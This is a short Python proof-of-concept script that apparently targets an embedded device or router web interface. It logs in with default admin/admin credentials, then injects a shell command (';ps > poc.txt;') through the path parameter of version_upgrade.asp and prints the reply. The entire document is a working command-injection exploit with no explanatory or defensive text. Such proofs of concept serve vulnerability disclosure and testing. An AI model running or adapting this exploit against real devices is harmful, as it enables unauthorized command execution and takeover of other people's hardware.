import requests  
# create a session  
session = requests.session()  
#  URL and header
login_url = "http://192.168.0.50/login.cgi"  
login_headers = {  
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",  
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  
    "Accept-Language": "en-US,en;q=0.5",  
    "Accept-Encoding": "gzip, deflate, br",  
    "Content-Type": "application/x-www-form-urlencoded",  
    "Origin": "http://192.168.0.1",  
    "Connection": "close",  
    "Referer": "http://192.168.0.1/login.html",  
    "Upgrade-Insecure-Requests": "1"  
}  
login_data = {  
    "user": "admin",  
    "password": "admin"  
}  
# POST login
login_response = session.post(login_url, headers=login_headers, data=login_data)  
# prepare request  
payload = ";ps > poc.txt;"  
command_url = f"http://192.168.0.50/version_upgrade.asp?path={payload}"  
command_headers = {  "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  "Accept-Language": "en-US,en;q=0.5",  "Accept-Encoding": "gzip, deflate, br",  "Connection": "close",  "Upgrade-Insecure-Requests": "1"  
}  
# GET exec command 
response = session.get(command_url, headers=command_headers)   
print(response.text) 
